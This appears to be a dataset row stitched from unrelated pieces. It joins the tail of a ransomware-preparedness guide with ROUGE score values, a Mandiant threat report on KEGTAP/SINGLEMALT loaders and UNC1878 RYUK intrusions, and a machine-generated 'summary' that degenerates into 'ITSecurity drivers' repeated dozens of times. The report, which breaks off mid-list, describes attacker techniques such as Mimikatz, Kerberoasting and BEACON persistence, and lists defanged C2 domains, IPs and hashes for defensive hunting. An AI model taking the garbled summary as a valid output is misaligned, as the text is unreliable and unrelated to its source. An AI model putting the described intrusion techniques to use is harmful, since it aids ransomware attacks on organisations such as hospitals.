or server. Retain backup hardware to rebuild systems in the event rebuilding the primary system is not preferred. Hardware that is newer or older than the primary system can present installation or compatibility hurdles when rebuilding from images. Ensure all backup hardware is properly patched.In addition to system images, applicable source code or executables should be available (stored with backups, escrowed, license agreement to obtain, etc.). It is more efficient to rebuild from system images, but some images will not install on different hardware or platforms correctly; having separate access to needed software will help in these cases.Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response and notification procedures for a ransomware incident. Review available";en;{'r': 0.21839080459770116, 'p': 0.9457013574660633, 'f': 0.35483870662921824};{'r': 0.17908562768375852, 'p': 0.9183937823834197, 'f': 0.2997252139250654};{'r': 0.21839080459770116, 'p': 0.9457013574660633, 'f': 0.35483870662921824}
https://www.mandiant.com/resources/blog/kegtap-and-singlemalt-with-a-ransomware-chaser;Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser;"Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat.The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9.The operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis, demonstrating a clear disregard for human life.Email Campaign TTPsCampaigns distributing KEGTAP, SINGLEMALT and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity:Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file.This document contains an in-line link to a URL hosting a malware payload.Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys or queries about business hours.Some email communications have included the recipient's name or employer name in the subject line and/or email body.Despite this uniformity, the associated TTPs have otherwise changed regularly--both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include:Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service.The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns these malware binaries were hosted on compromised infrastructure, however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains.In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links.Some campaigns have also incorporated customization, including emails with internal references to the recipients' organizations (Figure 1) and organizations' logos embedded into the Google Docs documents (Figure 2).Figure 1: Email containing internal references to target an organization's nameFigure 2: Google Docs PDF document containing a target organization's logoHiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains, however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult.Post-Compromise TTPsGiven the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware.Establish FootholdOnce the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle.Maintain PresenceBeyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot.The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using /setnotifycmdline, and adding itself to the Userinit value under the following registry key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents.We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor.The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot.In at least once case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication.Escalate PrivilegesThe most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts.The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We've observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON.Actors have gained access to credentials via exported copies of the ntds.dit Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller.In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet.ReconnaissanceThe approaches taken to perform host and network reconnaissance across these incidents varied, however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON.BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include: Get-GPPPassword Invoke-AllChecks Invoke-BloodHound Invoke-EternalBlue Invoke-FileFinder Invoke-HostRecon Invoke-Inveigh Invoke-Kerberoast Invoke-LoginPrompt Invoke-mimikittenz Invoke-ShareFinder Invoke-UserHunterMandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including ipconfig, findstr, and cmd.exe.The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials.WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture.The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to res.txt.The actors used the Nltest command to list domain controllers.Lateral MovementLateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP and SMB, or using the same backdoors used to establish a foothold in victim networks.The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments.The actors commonly moved laterally within victim environments using compromised accounts--both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols.The actors used the Windows net use command to connect to Windows admin shares to move laterally.Complete MissionMandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment.In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server.The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files.The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise.The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis.Hunting StrategiesIf an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel.Isolate and perform a forensic review of any impacted systems.Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes.Identify the URLs used by the phishing campaign and block them using proxy or network security devices.Reset credentials for any user accounts associated with execution of the malware.Perform an enterprise wide review for lateral movement authentication from the impacted systems.Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc) and move towards multi-factor authentication (MFA) as soon as possible.An enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows.Activity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon registry key.%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\adobe.lnkFigure 3: Example LNK file associated with KEGTAP persistence within a system's startup foldersSINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host run the command bitsadmin /list.Display name may be ""Adobe Update"", ""System autoupdate"" or another generic value.Notify state may be set to Fail (Status 2).FileList URL value may be set to the local host or a URL that does not exist.The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it.The Retry Delay value will be set.WINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware.Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Backup Mgr Value: Path to the backdoorFigure 4: Example registry RUN key used by WINEKEY to maintain persistenceThe ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case.The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: <Random directory within %APPDATA%> autoupdate<random number>.All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise.Although it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the C:\Windows\SysWOW64 directory that have a file name matching the following pattern: <8 random lowercase chars>.exe. Stacking or sorting on file creation timestamps in the C:\Windows\SysWOW64 directory may also help identify malicious files, as the directory should be mostly static.Post-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence.The following are additional strategies that may aid in identifying associated activity:Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration or communication services with a referrer from a Google Docs document.During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share.While collecting data used to enable later-stage operations, the attackers commonly leave instances of ntds.dit and exports of the SYSTEM and SECURITY registry hives on impacted systems.Hardening StrategiesThe actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper.Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation.Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins.Actors often pick just a few accounts to use for RDP, by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor.Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON.Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that do not have a business categorization.Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.For more intelligence on ransomware and other threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform. Check out this episode of State of the Hack for additional information on this threat.Campaign IndicatorsSample Email Subjects / Patterns<(first|last)-name>: Important Information<Company Name><Company Name> complaint<(first|last)-name><(first|last)-name>Agreement cancellation messageAgreement cancellation noticeAgreement cancellation notificationAgreement cancellation reminderAgreement suspension messageAgreement suspension noticeAgreement suspension notificationAgreement suspension reminderArrangement cancellation messageArrangement cancellation noticeArrangement cancellation notificationArrangement cancellation reminderArrangement suspension messageArrangement suspension noticeArrangement suspension notificationArrangement suspension reminderContract cancellation messageContract cancellation noticeContract cancellation notificationContract cancellation reminderContract suspension messageContract suspension noticeContract suspension notificationContract suspension reminderdebit confirmationFW: <Name> Annual Bonus Report is ReadyFW: Urgent: <Company Name>: A Customer Complaint Request - Prompt Action RequiredRE: <(first|last)-name>RE: <(first|last)-name>: Your Payslip for OctoberRE: <Company Name> - my visitRE: <Company Name> Employee SurveyRE: <Company Name> officeRE: <Name> about complaintRE: <Name> bonusRE: <Name> termination listRE: <Name>RE: <Company Name> officeRE: <(first|last)-name>RE: <(first|last)-name> <(first|last)-name>: complaintRE: <(first|last)-name>: SubpoenaRE: <(first|last)-name>RE: <(first|last)-name>: Your Payslip for SeptemberRE: about complaintRE: Adopted Filer FormsRE: Business hours adjustmentRE: Business hours realignmentRE: Business hours rearrangementRE: Business hours restructuringRE: Business schedule adjustmentRE: Business schedule realignmentRE: Business schedule rearrangementRE: Business schedule restructuringRE: call meRE: changesRE: complaintRE: Complaint in <Company Name>.RE: Complaint on <Name>RE: customer requestRE: debit confirmationRE: document copyRE: documents listRE: Edgar Filer forms renovationsRE: employee bonusesRE: Filer Forms adaptationsRE: my callRE: New filer form typesRE: officeRE: our meetingRE: Payroll RegisterRE: report confirmationRE: situationRE: SubpoenaRE: terminationRE: till 2 pmRE: Urgent <Company Name> Employee Internal SurveyRE: visitRE: what about your opinion?RE: what time?RE: whyRE: why this debitRE: Working schedule adjustmentRE: Working schedule realignmentRE: Working schedule rearrangementRE: Working schedule restructuringRE: Your Payslip for SeptemberExample Malware Family MD5sKEGTAP df00d1192451268c31c1f8568d1ff472BEERBOT 6c6a2bfa5846fab374b2b97e65095ec9SINGLEMALT 37aa5690094cb6d638d0f13851be4246STILLBOT 3176c4a2755ae00f4fffe079608c7b25WINEKEY 9301564bdd572b0773f105287d8837c4CORKBOT 0796f1c1ea0a142fc1eb7109a44c86cbCode Signing Certificate CNsARTBUD RADOM SP Z O OBESPOKE SOFTWARE SOLUTIONS LIMITEDBest Fud, OOOBlueMarble GmbHCHOO FSP, LLCCompany Megacom SP Z O OESTELLA, OOOEXON RENTAL SP Z O OGeksan LLCGLOBAL PARK HORIZON SP Z O OInfinite Programming LimitedJames LTH d.o.o.Logika OOOMADAS d.o.o.MUSTER PLUS SP Z O ONEEDCODE SP Z O ONordkod LLCNOSOV SP Z O OOOO MEPPLAN CORP PTY LTDREGION TOURISM LLCRESURS-RM OOORetalit LLCRumikon LLCSNAB-RESURS, OOOTARAT d.o.o.TES LOGISTIKA d.o.o.VAS CO PTY LTDVB CORPORATE PTY. LTD.VITA-DE d.o.o.UNC1878 IndicatorsA significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group.BEACON C2sFirst Seen Domain 12/11/19 updatemanagir[.]us 12/20/19 cmdupdatewin[.]com 12/26/19 scrservallinst[.]info 1/10/20 winsystemupdate[.]com 1/11/20 jomamba[.]best 1/13/20 updatewinlsass[.]com 1/16/20 winsysteminfo[.]com 1/20/20 livecheckpointsrs[.]com 1/21/20 ciscocheckapi[.]com 1/28/20 timesshifts[.]com 1/29/20 cylenceprotect[.]com 1/30/20 sophosdefence[.]com 1/30/20 taskshedulewin[.]com 1/30/20 windefenceinfo[.]com 1/30/20 lsasswininfo[.]com 1/30/20 update-wind[.]com 1/30/20 lsassupdate[.]com 1/30/20 renovatesystem[.]com 1/31/20 updatewinsoftr[.]com 2/2/20 cleardefencewin[.]com 2/2/20 checkwinupdate[.]com 2/2/20 havesetup[.]net 2/3/20 update-wins[.]com 2/3/20 conhostservice[.]com 2/4/20 microsoftupdateswin[.]com 2/4/20 iexploreservice[.]com 2/12/20 avrenew[.]com 2/12/20 target-support[.]online 2/12/20 web-analysis[.]live 2/14/20 freeallsafe[.]com 2/17/20 windefens[.]com 2/17/20 defenswin[.]com 2/17/20 easytus[.]com 2/17/20 greattus[.]com 2/17/20 livetus[.]com 2/17/20 comssite[.]com 2/17/20 findtus[.]com 2/17/20 bigtus[.]com 2/17/20 aaatus[.]com 2/17/20 besttus[.]com 2/17/20 firsttus[.]com 2/17/20 worldtus[.]com 2/26/20 freeoldsafe[.]com 2/26/20 serviceupdates[.]net 2/26/20 topserviceupdater[.]com 2/27/20 myserviceupdater[.]com 2/29/20 myservicebooster[.]net 2/29/20 servicesbooster[.]org 2/29/20 brainschampions[.]com 2/29/20 myservicebooster[.]com 2/29/20 topservicesbooster[.]com 2/29/20 servicesbooster[.]com 2/29/20 topservicesecurity[.]org 2/29/20 topservicesecurity[.]net 2/29/20 topsecurityservice[.]net 2/29/20 myyserviceupdater[.]com 2/29/20 topservicesupdate[.]com 2/29/20 topservicesecurity[.]com 2/29/20 servicesecurity[.]org 2/29/20 myserviceconnect[.]net 3/2/20 topservicesupdates[.]com 3/2/20 yoursuperservice[.]com 3/2/20 topservicehelper[.]com 3/2/20 serviceuphelper[.]com 3/2/20 serviceshelpers[.]com 3/2/20 boostsecuritys[.]com 3/3/20 hakunamatatata[.]com 3/8/20 service-updater[.]com 3/9/20 secondserviceupdater[.]com 3/9/20 twelvethserviceupdater[.]com 3/9/20 twentiethservicehelper[.]com 3/9/20 twelfthservicehelper[.]com 3/9/20 tenthservicehelper[.]com 3/9/20 thirdserviceupdater[.]com 3/9/20 thirdservicehelper[.]com 3/9/20 tenthserviceupdater[.]com 3/9/20 thirteenthservicehelper[.]com 3/9/20 seventeenthservicehelper[.]com 3/9/20 sixteenthservicehelper[.]com 3/9/20 sixthservicehelper[.]com 3/9/20 seventhservicehelper[.]com 3/9/20 seventhserviceupdater[.]com 3/9/20 sixthserviceupdater[.]com 3/9/20 secondservicehelper[.]com 3/9/20 ninthservicehelper[.]com 3/9/20 ninethserviceupdater[.]com 3/9/20 fourteenthservicehelper[.]com 3/9/20 fourthserviceupdater[.]com 3/9/20 firstserviceupdater[.]com 3/9/20 firstservisehelper[.]com 3/9/20 fifthserviceupdater[.]com 3/9/20 eleventhserviceupdater[.]com 3/9/20 fifthservicehelper[.]com 3/9/20 fourservicehelper[.]com 3/9/20 eighthservicehelper[.]com 3/9/20 eighteenthservicehelper[.]com 3/9/20 eighthserviceupdater[.]com 3/9/20 fifteenthservicehelper[.]com 3/9/20 nineteenthservicehelper[.]com 3/9/20 eleventhservicehelper[.]com 3/14/20 thirdservice-developer[.]com 3/14/20 fifthservice-developer[.]com 3/15/20 firstservice-developer[.]com 3/16/20 fourthservice-developer[.]com 3/16/20 ninethservice-developer[.]com 3/16/20 seventhservice-developer[.]com 3/16/20 secondservice-developer[.]com 3/16/20 sixthservice-developer[.]com 3/16/20 tenthservice-developer[.]com 3/16/20 eithtservice-developer[.]com 3/17/20 servicedupdater[.]com 3/17/20 service-updateer[.]com 3/19/20 sexyservicee[.]com 3/19/20 serviceboostnumberone[.]com 3/19/20 servicedbooster[.]com 3/19/20 service-hunter[.]com 3/19/20 servicedhunter[.]com 3/19/20 servicedpower[.]com 3/19/20 sexycservice[.]com 3/23/20 yourserviceupdater[.]com 3/23/20 top-serviceupdater[.]com 3/23/20 top-servicebooster[.]com 3/23/20 serviceshelps[.]com 3/23/20 servicemonsterr[.]com 3/23/20 servicehunterr[.]com 3/23/20 service-helpes[.]com 3/23/20 servicecheckerr[.]com 3/23/20 newservicehelper[.]com 3/23/20 huntersservice[.]com 3/23/20 helpforyourservice[.]com 3/23/20 boostyourservice[.]com 3/26/20 developmasters[.]com 3/26/20 actionshunter[.]com 5/4/20 info-develop[.]com 5/4/20 ayechecker[.]com 5/4/20 service-booster[.]com 9/18/20 zapored[.]com 9/22/20 gtrsqer[.]com 9/22/20 chalengges[.]com 9/22/20 caonimas[.]com 9/22/20 hakunaman[.]com 9/22/20 getinformationss[.]com 9/22/20 nomadfunclub[.]com 9/22/20 harddagger[.]com 9/22/20 errvghu[.]com 9/22/20 reginds[.]com 9/22/20 gameleaderr[.]com 9/22/20 razorses[.]com 9/22/20 vnuret[.]com 9/22/20 regbed[.]com 9/22/20 bouths[.]com 9/23/20 ayiyas[.]com 9/23/20 serviceswork[.]net 9/23/20 moonshardd[.]com 9/23/20 hurrypotter[.]com 9/23/20 biliyilish[.]com 9/23/20 blackhoall[.]com 9/23/20 checkhunterr[.]com 9/23/20 daggerclip[.]com 9/23/20 check4list[.]com 9/24/20 chainnss[.]com 9/29/20 hungrrybaby[.]com 9/30/20 martahzz[.]com 10/1/20 jonsonsbabyy[.]com 10/1/20 wondergodst[.]com 10/1/20 zetrexx[.]com 10/1/20 tiancaii[.]com 10/1/20 cantliee[.]com 10/1/20 realgamess[.]com 10/1/20 maybebaybe[.]com 10/1/20 saynoforbubble[.]com 10/1/20 chekingking[.]com 10/1/20 rapirasa[.]com 10/1/20 raidbossa[.]com 10/1/20 mountasd[.]com 10/1/20 puckhunterrr[.]com 10/1/20 pudgeee[.]com 10/1/20 loockfinderrs[.]com 10/1/20 lindasak[.]com 10/1/20 bithunterr[.]com 10/1/20 voiddas[.]com 10/1/20 sibalsakie[.]com 10/1/20 giveasees[.]com 10/1/20 shabihere[.]com 10/1/20 tarhungangster[.]com 10/1/20 imagodd[.]com 10/1/20 raaidboss[.]com 10/1/20 sunofgodd[.]com 10/1/20 rulemonster[.]com 10/1/20 loxliver[.]com 10/1/20 servicegungster[.]com 10/1/20 kungfupandasa[.]com 10/2/20 check1domains[.]com 10/5/20 sweetmonsterr[.]com 10/5/20 qascker[.]com 10/7/20 remotessa[.]com 10/7/20 cheapshhot[.]com 10/7/20 havemosts[.]com 10/7/20 unlockwsa[.]com 10/7/20 sobcase[.]com 10/7/20 zhameharden[.]com 10/7/20 mixunderax[.]com 10/7/20 bugsbunnyy[.]com 10/7/20 fastbloodhunter[.]com 10/7/20 serviceboosterr[.]com 10/7/20 servicewikii[.]com 10/7/20 secondlivve[.]com 10/7/20 quwasd[.]com 10/7/20 luckyhunterrs[.]com 10/7/20 wodemayaa[.]com 10/7/20 hybriqdjs[.]com 10/7/20 gunsdrag[.]com 10/7/20 gungameon[.]com 10/7/20 servicemount[.]com 10/7/20 servicesupdater[.]com 10/7/20 service-boosterr[.]com 10/7/20 serviceupdatter[.]com 10/7/20 dotmaingame[.]com 10/12/20 backup1service[.]com 10/13/20 bakcup-monster[.]com 10/13/20 bakcup-checker[.]com 10/13/20 backup-simple[.]com 10/13/20 backup-leader[.]com 10/13/20 backup-helper[.]com 10/13/20 service-checker[.]com 10/13/20 nasmastrservice[.]com 10/14/20 service-leader[.]com 10/14/20 nas-simple-helper[.]com 10/14/20 nas-leader[.]com 10/14/20 boost-servicess[.]com 10/14/20 elephantdrrive[.]com 10/15/20 service-hellper[.]com 10/16/20 top-backuphelper[.]com 10/16/20 best-nas[.]com 10/16/20 top-backupservice[.]com 10/16/20 bestservicehelper[.]com 10/16/20 backupnas1[.]com 10/16/20 backupmastter[.]com 10/16/20 best-backup[.]com 10/17/20 viewdrivers[.]com 10/19/20 topservicebooster[.]com 10/19/20 topservice-masters[.]com 10/19/20 topbackupintheworld[.]com 10/19/20 topbackup-helper[.]com 10/19/20 simple-backupbooster[.]com 10/19/20 top3-services[.]com 10/19/20 backup1services[.]com 10/21/20 backupmaster-service[.]com 10/21/20 backupmasterservice[.]com 10/21/20 service1updater[.]com 10/21/20 driverdwl[.]com 10/21/20 backup1master[.]com 10/21/20 boost-yourservice[.]com 10/21/20 checktodrivers[.]com 10/21/20 backup1helper[.]com 10/21/20 driver1updater[.]com 10/21/20 driver1master[.]com 10/23/20 view-backup[.]com 10/23/20 top3servicebooster[.]com 10/23/20 servicereader[.]com 10/23/20 servicehel[.]com 10/23/20 driver-boosters[.]com 10/23/20 service1update[.]com 10/23/20 service-hel[.]com 10/23/20 driver1downloads[.]com 10/23/20 service1view[.]com 10/23/20 backups1helper[.]com 10/25/20 idriveview[.]com 10/26/20 debug-service[.]com 10/26/20 idrivedwn[.]com 10/28/20 driverjumper[.]com 10/28/20 service1boost[.]com 10/28/20 idriveupdate[.]com 10/28/20 idrivehepler[.]com 10/28/20 idrivefinder[.]com 10/28/20 idrivecheck[.]com 10/28/20 idrivedownload[.]comFirst Seen Server Subject MD5 12/12/19 140.82.60.155:443 CN=updatemanagir[.]us ec16be328c09473d5e5c07310583d85a 12/21/19 96.30.192.141:443 CN=cmdupdatewin[.]com 3d4de17df25412bb714fda069f6eb27e 1/6/20 45.76.49.78:443 CN=scrservallinst[.]info cd6035bd51a44b597c1e181576dd44d9 1/8/20 149.248.58.11:443 CN=updatewinlsass[.]com 8c581979bd11138ffa3a25b895b97cc0 1/9/20 96.30.193.57:443 CN=winsystemupdate[.]com e4e732502b9658ea3380847c60b9e0fe 1/14/20 95.179.219.169:443 CN=jomamba[.]best 80b7001e5a6e4bd6ec79515769b91c8b 1/16/20 140.82.27.146:443 CN=winsysteminfo[.]com 29e656ba9d5d38a0c17a4f0dd855b37e 1/19/20 45.32.170.9:443 CN=livecheckpointsrs[.]com 1de9e9aa8363751c8a71c43255557a97 1/20/20 207.148.8.61:443 CN=ciscocheckapi[.]com 97ca76ee9f02cfda2e8e9729f69bc208 1/28/20 209.222.108.106:443 CN=timesshifts[.]com 2bb464585f42180bddccb50c4a4208a5 1/29/20 31.7.59.141:443 CN=updatewinsoftr[.]com 07f9f766163c344b0522e4e917035fe1 1/29/20 79.124.60.117:443 C=US 9722acc9740d831317dd8c1f20d8cfbe 1/29/20 66.42.86.61:443 CN=lsassupdate[.]com 3c9b3f1e12473a0fd28dc37071168870 1/29/20 45.76.20.140:443 CN=cylenceprotect[.]com da6ce63f4a52244c3dced32f7164038a 1/29/20 45.76.20.140:80 CN=cylenceprotect[.]com da6ce63f4a52244c3dced32f7164038a 1/30/20 149.248.5.240:443 CN=sophosdefence[.]com e9b4b649c97cdd895d6a0c56015f2e68 1/30/20 144.202.12.197:80 CN=windefenceinfo[.]com c6c63024b18f0c5828bd38d285e6aa58 1/30/20 149.248.5.240:80 CN=sophosdefence[.]com e9b4b649c97cdd895d6a0c56015f2e68 1/30/20 149.28.246.25:80 CN=lsasswininfo[.]com f9af8b7ddd4875224c7ce8aae8c1b9dd 1/30/20 144.202.12.197:443 CN=windefenceinfo[.]com c6c63024b18f0c5828bd38d285e6aa58 1/30/20 149.28.246.25:443 CN=lsasswininfo[.]com f9af8b7ddd4875224c7ce8aae8c1b9dd 1/30/20 45.77.119.212:443 CN=taskshedulewin[.]com e1dc7cecd3cb225b131bdb71df4b3079 1/30/20 45.77.119.212:80 CN=taskshedulewin[.]com e1dc7cecd3cb225b131bdb71df4b3079 1/30/20 149.28.122.130:443 CN=renovatesystem[.]com 734c26d93201cf0c918135915fdf96af 1/30/20 45.32.170.9:80 CN=livecheckpointsrs[.]com 1de9e9aa8363751c8a71c43255557a97 1/30/20 149.248.58.11:80 CN=updatewinlsass[.]com 8c581979bd11138ffa3a25b895b97cc0 1/30/20 149.28.122.130:80 CN=renovatesystem[.]com 734c26d93201cf0c918135915fdf96af 1/30/20 207.148.8.61:80 CN=ciscocheckapi[.]com 97ca76ee9f02cfda2e8e9729f69bc208 1/31/20 81.17.25.210:443 CN=update-wind[.]com 877bf6c685b68e6ddf23a4db3789fcaa 1/31/20 31.7.59.141:80 CN=updatewinsoftr[.]com 07f9f766163c344b0522e4e917035fe1 2/2/20 155.138.214.247:80 CN=cleardefencewin[.]com 61df4864dc2970de6dcee65827cc9a54 2/2/20 1";The ITSecurity report provides an overview of the current state of ITSecurity in the company. The report identifies potential risks and vulnerabilities in the company's IT infrastructure and provides recommendations on how to mitigate these risks and vulnerabilities. The ITSecurity report provides a comprehensive overview of the current state of ITSecurity in the world. It covers topics such as ITSecurity threats, ITSecurity best practices, ITSecurity services, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity 